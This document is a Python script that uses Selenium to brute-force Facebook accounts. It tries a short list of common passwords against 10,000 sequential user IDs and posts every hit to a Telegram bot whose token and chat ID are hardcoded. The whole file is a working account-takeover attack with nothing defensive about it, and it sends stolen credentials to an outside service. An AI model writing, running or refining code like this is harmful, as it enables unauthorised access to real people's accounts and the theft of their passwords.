import time
import random
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor

TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    'password', '112233', '445566', '778899', '000000', '111111', '12345',
    'facebook', 'love123', 'king123', '20042004', '20052005'
]

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def check_account(uid):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    # تثبيت وإعداد المتصفح تلقائياً
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    
    try:
        for pas in PASS_LIST:
            driver.get("https://m.facebook.com/login.php")
            time.sleep(2)
            driver.find_element(By.ID, "m_login_email").send_keys(uid)
            driver.find_element(By.NAME, "pass").send_keys(pas)
            driver.find_element(By.NAME, "login").click()
            time.sleep(4)
            
            if "c_user" in driver.get_cookies():
                send_to_tg(f"✅ OK: {uid} | {pas}")
                break
            elif "checkpoint" in driver.current_url:
                send_to_tg(f"⚠️ CP: {uid} | {pas}")
                break
    except: pass
    finally: driver.quit()

def run_main():
    start_id = 26701173
    total = 10000
    send_to_tg(f"🚀 تم تثبيت Selenium.. بدأ فحص {total} حساب")
    ids = [str(start_id + i) for i in range(total)]
    with ThreadPoolExecutor(max_workers=5) as pool:
        pool.map(check_account, ids)

if __name__ == "__main__":
    run_main()
